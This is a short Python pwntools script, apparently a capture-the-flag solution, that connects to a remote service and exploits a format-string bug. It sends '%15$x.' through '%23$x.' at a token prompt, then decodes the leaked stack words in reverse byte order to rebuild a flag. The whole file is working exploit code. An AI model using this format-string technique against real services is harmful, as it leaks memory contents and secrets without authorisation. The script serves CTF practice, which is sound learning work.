from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

context.log_level = "warn"
# context.terminal = "kitty"

io = start()

io.sendline(b"1")

payload = b"".join([f"%{i}$x.".encode() for i in range(15, 24)])
io.sendlineafter(b"token?\n", payload)
io.recvuntil(b"token:\n")
flag = "".join(
    [bytes.fromhex(i)[::-1].decode() for i in io.recvline().decode().split(".")]
)

flag += "}"

print(flag)
